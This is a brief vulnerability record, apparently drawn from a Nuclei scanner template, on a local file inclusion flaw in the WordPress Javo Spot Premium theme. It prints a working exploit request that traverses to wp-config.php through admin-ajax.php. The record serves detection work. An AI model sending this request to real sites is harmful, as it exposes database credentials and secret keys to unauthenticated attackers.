# Vulnerability: WordPress Javo Spot Premium Theme - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`wp-javospot-lfi.yaml`)

## Description
WordPress Javo Spot Premium Theme is vulnerable to local file inclusion that allows remote unauthenticated attackers access to locally stored file and return their content.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-admin/admin-ajax.php?jvfrm_spot_get_json&fn=../../wp-config.php&callback=jQuery
```

